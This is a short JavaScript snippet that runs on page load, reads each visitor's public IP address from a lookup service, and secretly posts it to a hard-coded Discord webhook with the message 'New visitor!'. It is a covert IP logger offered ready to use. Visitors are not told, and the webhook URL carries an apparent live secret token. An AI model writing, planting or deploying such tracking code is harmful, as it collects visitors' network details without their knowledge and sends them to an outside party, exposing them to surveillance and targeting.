// ====== CONFIGURE YOUR WEBHOOK ======
const webhook = "https://discord.com/api/webhooks/1474073969790292130/KXnQaqXw1WPzQ4Q_ZpwU2AxUbmqO7rBk9keeMaV5pLxwcczq9OzaYeezS0BdtPKrJyM8";

// ====== GET PUBLIC IP AND SEND ======
async function sendPublicIP() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();

    await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `New visitor! Public IP: ${data.ip}`
      })
    });

  } catch (err) {
    console.log("Error:", err);
  }
}

// Run immediately when page loads
sendPublicIP();
